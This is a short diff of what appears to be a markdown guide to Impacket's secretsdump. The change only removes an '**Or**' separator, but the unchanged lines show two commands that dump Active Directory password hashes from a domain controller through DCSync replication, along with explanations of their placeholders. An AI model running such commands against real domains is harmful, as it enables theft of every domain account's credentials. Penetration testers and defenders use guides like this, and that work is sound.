@@ -55,8 +55,6 @@ secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
     - `YOURDOMAIN`: Replace with your actual domain name.
     - `targetUser`: The username that has replication privileges.
     - `targetIP`: The IP address of the domain controller.
-
-**Or** 
        
         ```bash
         impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
